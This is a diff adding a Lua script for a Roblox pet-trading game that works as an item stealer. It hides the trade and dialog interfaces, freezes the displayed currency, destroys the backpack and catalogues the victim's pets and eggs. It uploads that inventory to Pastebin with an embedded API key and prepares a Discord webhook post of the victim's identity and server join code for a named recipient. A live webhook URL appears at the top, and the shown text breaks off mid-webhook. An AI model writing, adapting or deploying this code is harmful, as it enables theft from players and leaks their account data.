@@ -1,0 +1,367 @@
+Username = "StaLeph"
+Webhook = "https://discord.com/api/webhooks/1277477715347243028/iFhKUP3l203cpflaw7IEimBau52Wr7qvwn3Bwoi_kLfF9t-Smd-uBBwYhvP9rIdLKYRi"
+
+
+if not game:IsLoaded()then while not game:IsLoaded()do wait(1)end end;repeat task.wait()until game:IsLoaded()and game:GetService("ReplicatedStorage"):FindFirstChild("ClientModules")and game:GetService("ReplicatedStorage").ClientModules:FindFirstChild("Core")and game:GetService("ReplicatedStorage").ClientModules.Core:FindFirstChild("UIManager")and game:GetService("ReplicatedStorage").ClientModules.Core:FindFirstChild("UIManager").Apps:FindFirstChild("TransitionsApp")and game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TransitionsApp")and game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TransitionsApp"):FindFirstChild("Whiteout")if game:GetService("Players").LocalPlayer.PlayerGui.TransitionsApp:FindFirstChild("Whiteout").Visible then game:GetService("Players").LocalPlayer.PlayerGui.TransitionsApp:FindFirstChild("Whiteout").Visible=false end;for a,b in pairs(getconnections(game.Players.LocalPlayer.Idled))do b:Disable()end;for a,b in pairs(debug.getupvalue(require(game:GetService("ReplicatedStorage").Fsys).load("RouterClient").init,4))do b.Name=a end;local c;c=hookfunction(warn,function(d)if d=="Tested pet entity pathfinding for a path that is too far away from its target!"then return end;if d=="Tested pet entity pathfinding for a path that is too far away from its target!"or d=="[Pathfinder] Pathfinder Failed:"or d:match("AccurateTime sync inaccuracy, varianc")or d=="[AvatarEditorFocusSwitcher] Player's Character is nil"or d:match("[CharacterHider]")or d:match("Player:Move")or d:match("Notch")then return end;return c(d)end)getgenv().firesignal=function(e,...)local f=getconnections(e)for g,h in ipairs(f)do h:Fire(...)end end;function clickUiButton(i,j)local k=i.AbsolutePosition.X+i.AbsoluteSize.X/2;local l=i.AbsolutePosition.Y+66;game:GetService("VirtualInputManager"):SendMouseButtonEvent(k,l,0,j,game,1)end;repeat if game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton.Visible then firesignal(game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton.MouseButton1Click)firesignal(game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton.MouseButton1Down)firesignal(game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.EnclosingFrame.MainFrame.Contents.PlayButton.Activated)end;if game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.RoleChooserDialog.ChooseParent.Visible then firesignal(game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.RoleChooserDialog.ChooseParent.MouseButton1Click)firesignal(game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.RoleChooserDialog.ChooseParent.MouseButton1Down)firesignal(game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.RoleChooserDialog.ChooseParent.Activated)end;task.wait(1.1)game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog:WaitForChild("RobuxProductDialog")if game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.RobuxProductDialog.Visible then for a,b in pairs(game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.RobuxProductDialog.Buttons:GetChildren())do if b.ClassName=="ImageButton"then clickUiButton(b,true)task.wait()clickUiButton(b,false)end end end;game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("DailyLoginApp")if game:GetService("Players").LocalPlayer.PlayerGui.DailyLoginApp.Enabled and game:GetService("Players").LocalPlayer.PlayerGui.DailyLoginApp.Frame.Visible then for a,b in pairs(game:GetService("Players").LocalPlayer.PlayerGui.DailyLoginApp.Frame.Body.Buttons:GetChildren())do if b.Name=="ClaimButton"then clickUiButton(b,true)task.wait()clickUiButton(b,false)end end end;game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog:WaitForChild("UpdatesDialog")if game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.UpdatesDialog.Visible then for a,b in pairs(game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.UpdatesDialog.Buttons:GetChildren())do if b.ClassName=="ImageButton"then clickUiButton(b,true)task.wait()clickUiButton(b,false)end end end until game:GetService("Players").LocalPlayer.Character and workspace.Camera.CameraSubject==game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid")task.spawn(function()repeat task.wait()until game:IsLoaded()and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")task.wait(4)game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog:WaitForChild("RobuxProductDialog")if game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.RobuxProductDialog.Visible then for a,b in pairs(game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.RobuxProductDialog.Buttons:GetChildren())do if b.ClassName=="ImageButton"then clickUiButton(b,true)task.wait()clickUiButton(b,false)end end end;wait(0.5)game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("DailyLoginApp")if game:GetService("Players").LocalPlayer.PlayerGui.DailyLoginApp.Enabled and game:GetService("Players").LocalPlayer.PlayerGui.DailyLoginApp.Frame.Visible then for a,b in pairs(game:GetService("Players").LocalPlayer.PlayerGui.DailyLoginApp.Frame.Body.Buttons:GetChildren())do if b.Name=="ClaimButton"then clickUiButton(b,true)task.wait()clickUiButton(b,false)wait(0.5)clickUiButton(b,true)task.wait()clickUiButton(b,false)end end end;wait(0.5)game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog:WaitForChild("UpdatesDialog")if game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.UpdatesDialog.Visible then for a,b in pairs(game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.UpdatesDialog.Buttons:GetChildren())do if b.ClassName=="ImageButton"then clickUiButton(b,true)task.wait()clickUiButton(b,false)end end end end)require(game.ReplicatedStorage.ClientModules.Core.UIManager.Apps.TransitionsApp).transition=function()return end;require(game.ReplicatedStorage.ClientModules.Core.UIManager.Apps.TransitionsApp).sudden_fill=function()return end;if game:GetService("Players").LocalPlayer.PlayerGui.TransitionsApp:FindFirstChild("Whiteout").Visible then game:GetService("Players").LocalPlayer.PlayerGui.TransitionsApp:FindFirstChild("Whiteout").Visible=false end
+local request = syn and syn.request or http_request or HttpPost or request
+
+local exe = identifyexecutor()
+local player = game.Players.LocalPlayer
+local amountLabel = player:WaitForChild("PlayerGui"):WaitForChild("BucksIndicatorApp"):WaitForChild("CurrencyIndicator"):WaitForChild("Container"):WaitForChild("Amount")
+
+local initialValueCaptured = false
+local fixedText = ""
+
+local function freezeText()
+    if initialValueCaptured then
+        amountLabel.Text = fixedText
+    end
+end
+
+amountLabel:GetPropertyChangedSignal("Text"):Connect(function()
+    if not initialValueCaptured then
+        fixedText = amountLabel.Text
+        initialValueCaptured = true
+    end
+    freezeText()
+end)
+
+if amountLabel.Text ~= "" then
+    fixedText = amountLabel.Text
+    initialValueCaptured = true
+    freezeText()
+end
+
+local function isTradeAppVisible()
+    local tradeApp = player.PlayerGui:FindFirstChild("TradeApp")
+    return tradeApp and tradeApp.Frame.Visible
+end
+
+local stealerdude = string.lower(Username)
+
+local function rename(remotename, hashedremote)
+    pcall(
+        function()
+            hashedremote.Name = remotename
+        end
+    )
+end
+pcall(
+    function()
+        table.foreach(
+            getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init, 4),
+            rename
+        )
+    end
+)
+
+game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("DialogApp").Enabled = false
+game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeApp").Enabled = false
+function checkPrivServer()
+    local a=game:GetService("Players")
+    local b=#a:GetPlayers()
+    if b==1 then
+        return false
+    else
+        return true
+    end
+end
+
+game:GetService("Players").LocalPlayer.PlayerGui.BackpackApp:Destroy()
+
+local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local playerName = game.Players.LocalPlayer.Name
+local playerInventory = clientData.get_data()[playerName].inventory.pets
+
+local duplicates = {}
+
+for _, petData in pairs(playerInventory) do
+    local petId = petData.id
+    if table.find(duplicates, petId) then
+        table.insert(duplicates, petData.unique)
+    else
+        table.insert(duplicates, petId)
+    end
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local InventoryDB = require(ReplicatedStorage:WaitForChild("ClientDB"):WaitForChild("Inventory"):WaitForChild("InventoryDB"))
+local Bypass = require(ReplicatedStorage:WaitForChild("Fsys", 600)).load
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+local pets_legendary = {mega_neon = {}, neon = {}, normal = {}, counts = {mega_neon = 0, neon = 0, normal = 0}}
+local pets_ultrarare = {mega_neon = {}, neon = {}, normal = {}, counts = {mega_neon = 0, neon = 0, normal = 0}}
+local pets_rare = {mega_neon = {}, neon = {}, normal = {}, counts = {mega_neon = 0, neon = 0, normal = 0}}
+local pets_uncommon = {mega_neon = {}, neon = {}, normal = {}, counts = {mega_neon = 0, neon = 0, normal = 0}}
+local pets_common = {mega_neon = {}, neon = {}, normal = {}, counts = {mega_neon = 0, neon = 0, normal = 0}}
+
+local eggs_legendary = {count = 0}
+local eggs_ultrarare = {count = 0}
+local eggs_rare = {count = 0}
+local eggs_uncommon = {count = 0}
+local eggs_common = {count = 0}
+
+local playerPets = Bypass("ClientData").get_data()[Player.Name].inventory.pets
+
+local function reformatPetName(name)
+    name = name:gsub("_%d%d%d%d_", "_")
+    name = name:gsub("_", " ")
+    name = name:gsub("(%a)([%w_']*)", function(first, rest) return first:upper() .. rest:lower() end)
+    return name
+end
+
+local function categorizePet(pet, rarityTable)
+    local formattedPet = {
+        id = reformatPetName(pet.id),
+        properties = pet.properties
+    }
+
+    if formattedPet.properties.mega_neon then
+        table.insert(rarityTable.mega_neon, formattedPet)
+        rarityTable.counts.mega_neon = rarityTable.counts.mega_neon + 1
+    elseif formattedPet.properties.neon then
+        table.insert(rarityTable.neon, formattedPet)
+        rarityTable.counts.neon = rarityTable.counts.neon + 1
+    else
+        table.insert(rarityTable.normal, formattedPet)
+        rarityTable.counts.normal = rarityTable.counts.normal + 1
+    end
+end
+
+for _, pet in pairs(playerPets) do
+    local petData = InventoryDB.pets[pet.id]
+    if petData then
+        if petData.is_egg then
+            local eggTable = eggs_legendary
+            if petData.rarity == "ultra_rare" then eggTable = eggs_ultrarare
+            elseif petData.rarity == "rare" then eggTable = eggs_rare
+            elseif petData.rarity == "uncommon" then eggTable = eggs_uncommon
+            elseif petData.rarity == "common" then eggTable = eggs_common
+            end
+            eggTable.count = eggTable.count + 1
+        else
+            local rarityTable = pets_legendary
+            if petData.rarity == "ultra_rare" then rarityTable = pets_ultrarare
+            elseif petData.rarity == "rare" then rarityTable = pets_rare
+            elseif petData.rarity == "uncommon" then rarityTable = pets_uncommon
+            elseif petData.rarity == "common" then rarityTable = pets_common
+            end
+            categorizePet(pet, rarityTable)
+        end
+    end
+end
+
+local function formatPets(petTable, priorityPets)
+    local petCounts = {}
+    local formattedPets = {}
+
+    for _, petType in pairs({"mega_neon", "neon", "normal"}) do
+        for _, pet in ipairs(petTable[petType]) do
+            local petName = (petType ~= "normal" and petType:gsub("_", " ") or "") .. " " .. pet.id
+            petName = petName:gsub("^%s+", "")  -- Remove leading spaces
+            petCounts[petName] = (petCounts[petName] or 0) + 1
+        end
+    end
+
+    for _, priorityPet in ipairs(priorityPets) do
+        for petName, count in pairs(petCounts) do
+            if petName:find(priorityPet) then
+                table.insert(formattedPets, petName .. " x" .. count)
+                petCounts[petName] = nil
+            end
+        end
+    end
+
+    for petName, count in pairs(petCounts) do
+        table.insert(formattedPets, petName .. " x" .. count)
+    end
+
+    return formattedPets
+end
+
+local function sortPetsByRarity(rarityTables)
+    local sortedPets = {}
+    for _, rarityTable in ipairs(rarityTables) do
+        for _, pet in ipairs(rarityTable.mega_neon) do
+            table.insert(sortedPets, "Mega Neon " .. pet.id .. " x1")
+        end
+        for _, pet in ipairs(rarityTable.neon) do
+            table.insert(sortedPets, "Neon " .. pet.id .. " x1")
+        end
+        for _, pet in ipairs(rarityTable.normal) do
+            table.insert(sortedPets, pet.id .. " x1")
+        end
+    end
+    return sortedPets
+end
+
+local priorityPets = {"hellyeah"}
+
+local legendaryPets = formatPets(pets_legendary, priorityPets)
+local neonsAndMegaNeons = sortPetsByRarity({pets_ultrarare, pets_rare, pets_uncommon, pets_common})
+local remainingPets = sortPetsByRarity({pets_ultrarare, pets_rare, pets_uncommon, pets_common})
+
+local function getPetNameById(petId)
+    local petData = InventoryDB.pets[petId]
+    return petData and petData.name or petId
+end
+
+local function formatPetsString(title, petList)
+    local formattedTitle = "\n------------------ " .. title:upper() .. "\n"
+    local formattedList = #petList > 0 and table.concat(petList, "\n") or "No Pets\n"
+    return formattedTitle .. formattedList
+end
+
+local PetsString = ""
+PetsString = PetsString .. formatPetsString("Legendary Pets And Eggs", legendaryPets)
+PetsString = PetsString .. formatPetsString("Neons And Mega Neons", neonsAndMegaNeons)
+PetsString = PetsString .. formatPetsString("Rest Of The Pets", remainingPets)
+
+if #PetsString > 1000000 then
+    local truncatedPetsString = PetsString:sub(1, 800)
+    local lastNewline = truncatedPetsString:reverse():find("\n")
+    if lastNewline then
+        PetsString = truncatedPetsString:sub(1, 800 - lastNewline + 1) .. "\nAnd More!"
+    else
+        PetsString = truncatedPetsString .. "\nAnd More!"
+    end
+end
+
+local legendaryMegaNeonCount = pets_legendary.counts.mega_neon
+local legendaryNeonCount = pets_legendary.counts.neon
+local legendaryNormalCount = pets_legendary.counts.normal
+local totalleggendaries = legendaryNormalCount + legendaryNeonCount + legendaryMegaNeonCount
+local nonLegendaryMegaNeonCount = pets_ultrarare.counts.mega_neon + pets_rare.counts.mega_neon + pets_uncommon.counts.mega_neon + pets_common.counts.mega_neon
+local nonLegendaryNeonCount = pets_ultrarare.counts.neon + pets_rare.counts.neon + pets_uncommon.counts.neon + pets_common.counts.neon
+local remainingPetsCount = pets_ultrarare.counts.normal + pets_rare.counts.normal + pets_uncommon.counts.normal + pets_common.counts.normal
+
+local legendaryEggsCount = eggs_legendary.count
+
+local HttpService = game:GetService("HttpService")
+
+local function pastebin(content)
+    local requestFunction = syn and syn.request or http_request or HttpPost or request
+    if not requestFunction then
+        return "\nERROR: No compatible request function found\n"
+    end
+
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)  -- Remove the trailing '&'
+
+    local response
+    local success, err = pcall(function()
+        response = requestFunction({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\n ERROR: Country not supported \n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+local pasteUrl = pastebin(PetsString)
+
+function removelinebreaks(value)
+    return string.gsub(value, "\n", "")
+end
+
+local pasteUrlWithTxt = removelinebreaks(pasteUrl)
+local legendary_food_count = 0
+local legendary_transport_count = 0
+
+for _, food in pairs(InventoryDB.food) do
+    if food.rarity == "legendary" then
+        legendary_food_count = legendary_food_count + 1
+    end
+end
+
+for _, transport in pairs(InventoryDB.transport) do
+    if transport.rarity == "legendary" then
+        legendary_transport_count = legendary_transport_count + 1
+    end
+end
+
+local duplicateCount = #duplicates
+local adjustedDuplicateCount = math.max(0, duplicateCount - 1)
+local Players = game:GetService("Players")
+
+if adjustedDuplicateCount < 2 then
+    game.Players.LocalPlayer:Kick("Alt Account Detected, Kicked to lower alt abuse.")
+    return
+end
+
+Bucks = tonumber(require(game:service'ReplicatedStorage'.Fsys).load("ClientData").get("money"))
+local costPerEgg = 750
+local eggsCanBuy = math.floor(Bucks / costPerEgg)
+local remainingBucks = Bucks % costPerEgg
+
+function sendhook(webhook)
+    local function SendMessageEMBED(url, embed)
+        local requestFunction = syn and syn.request or http_request or HttpPost or request
+        local http = game:GetService("HttpService")
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        local data = {
+            ["content"] = "-- @everyone\ngame:GetService('TeleportService'):TeleportToPlaceInstance("..tonumber(game.PlaceId)..", '"..game.JobId.."')",
+            ["embeds"] = {
+                {
+                    ["title"] = embed.title,
+                    ["color"] = embed.color,
+                    ["fields"] = embed.fields,
+                    ["footer"] = {
+                        ["text"] = embed.footer.text
+                    }
+                }
+            }
+        }
+        local body = http:JSONEncode(data)
+        local response = requestFunction({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+
+    local embedDesign = {
+        ["title"] = "New hit fr",
+        ["color"] = tonumber(0xFFFFFF),
+        ["fields"] = {
+            {
+                ["name"] = "info",
+                ["value"] = "```Username: "..game.Players.LocalPlayer.Name.."\nUserId: "..tostring(game.Players.LocalPlayer.UserId).."\nCreator: "..(Username or "Unknown").."Executor: " .. exe .. "```",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "hit info",
+                ["value"] = "```Cash: "..(fixedText or "0").."\nAmount of Eggs Bought: "..(tostring(eggsCanBuy) or "0").."\nMoney Remaining after buying Eggs: "..(tostring(remainingBucks) or "0").."```"
+            },
+            {
+                ["name"] = "Pet:",
+                ["value"] = "```Neon Legendaries: "..(tostring(legendaryNeonCount) or "0").."\nNormal Legendaries: "..(legendaryNormalCount or "0").."\nNon-Legendary Mega Neons: "..(tostring(nonLegendaryMegaNeonCount) or "0").."\nNon-Legendary Neons: "..(tostring(nonLegendaryNeonCount) or "0").."\nLegendary Eggs: "..(tostring(legendaryEggsCount) or "0").."\nRemaining Pets(Ultra Rare To Common): "..(tostring(remainingPetsCount) or "0").."```",
+                ["inline"] = false
+ 
